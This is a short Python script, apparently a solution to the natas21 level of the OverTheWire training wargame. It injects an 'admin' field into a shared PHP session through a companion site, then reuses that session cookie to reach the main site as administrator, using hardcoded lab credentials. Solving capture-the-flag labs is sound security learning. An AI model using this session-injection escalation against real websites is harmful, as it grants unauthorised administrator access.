import requests

target = 'http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org/index.php'
s = requests.Session()
s.auth = ('natas21','IFekPyrQXftziDEsUr3x21sYuahypdgJ')

data = {'align':'center','fontsize':'100%','bgcolor':'yellow','admin':'1','submit':'Update'}
r = s.post(target,data=data)
admin = s.cookies['PHPSESSID']

target2 = 'http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org/'
cookie = {'PHPSESSID':admin}
x = s.get(target2,cookies=cookie)
print x.text